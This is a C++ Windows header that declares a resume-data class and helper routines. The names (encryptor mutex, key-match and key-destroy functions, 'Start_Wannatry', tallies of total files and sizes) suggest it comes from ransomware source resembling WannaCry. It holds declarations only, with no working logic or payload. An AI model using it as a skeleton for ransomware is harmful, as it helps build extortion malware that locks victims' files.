#pragma once
#include <Windows.h>
#include <tchar.h>
#include <time.h>

#define RES_ID_SIZE 0x60

class RESDATA {
	TCHAR m_FileName[MAX_PATH];
	UCHAR m_nID[RES_ID_SIZE];
	time_t m_ExecTime;
	UCHAR _reserved[16];
	time_t m_EndTime;
	time_t m_StartTime;
	ULONG m_TotalFile;
	LARGE_INTEGER m_TotalSize;
	BOOL Load();
	BOOL Save();
public:
	RESDATA(LPCTSTR);
	~RESDATA();
//	BOOL SetExecTime(time_t);
	BOOL SetEndTime(time_t);
	BOOL SetStartTime(time_t);
	BOOL SetTotalFile(ULONG);
	BOOL AddTotalFile(ULONG);
	BOOL SetTotalSize(PLARGE_INTEGER);
	BOOL AddTotalSize(PLARGE_INTEGER);


	time_t GetExecTime() { return m_ExecTime; }
	time_t GetEndTime() { return m_EndTime; }
	time_t GetStartTime() { return m_StartTime; }
	ULONG GetTotalFile() { return m_TotalFile; }
	void GetTotalSize(PLARGE_INTEGER p)
	{ CopyMemory(p, &m_TotalSize, sizeof(m_TotalSize)); }
};

typedef RESDATA* PRESDATA;

///////////////////////
// Other routines
///////////////////////

BOOL CheckEncryptorMutex(LPCTSTR);
BOOL CreateEncryptorMutex(LPCTSTR);

BOOL CheckDKYThread(LPVOID);
BOOL DriverMonitorThread();

HANDLE CreateThread_CheckKeyMatch(PBOOL);
HANDLE CreateThread_DriverMonitor();





BOOL Start_Wannatry(LPCTSTR);

BOOL Destroy_Key(DWORD);
BOOL IsKeyDestroyed(DWORD);